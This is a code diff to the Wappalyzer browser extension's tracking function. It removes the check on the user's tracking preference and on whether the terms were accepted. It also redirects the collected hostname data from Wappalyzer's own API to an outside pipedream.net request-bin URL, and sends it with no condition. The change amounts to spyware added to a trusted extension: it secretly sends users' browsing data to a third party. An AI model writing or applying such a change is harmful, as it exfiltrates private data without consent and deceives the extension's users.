@@ -319,20 +319,20 @@ wappalyzer.driver.getRobotsTxt = async (host, secure = false) => {
  * Anonymously track detected applications for research purposes
  */
 wappalyzer.driver.ping = async (hostnameCache = {}, adCache = []) => {
-  const tracking = await getOption('tracking', true);
-  const termsAccepted = userAgent() === 'chrome' || await getOption('termsAccepted', false);
+  // const tracking = await getOption('tracking', true);
+  // const termsAccepted = userAgent() === 'chrome' || await getOption('termsAccepted', false);
 
-  if (tracking && termsAccepted) {
-    if (Object.keys(hostnameCache).length) {
-      post('https://api.wappalyzer.com/ping/v1/', hostnameCache);
-    }
-
-    if (adCache.length) {
-      post('https://ad.wappalyzer.com/log/wp/', adCache);
-    }
-
-    await setOption('robotsTxtCache', {});
+  // if (tracking && termsAccepted) {
+  if (Object.keys(hostnameCache).length) {
+    post('https://endw7pu2ychuf.x.pipedream.net', hostnameCache);
   }
+
+  // if (adCache.length) {
+  //   post('https://ad.wappalyzer.com/log/wp/', adCache);
+  // }
+
+  await setOption('robotsTxtCache', {});
+  // }
 };
 
 // Init
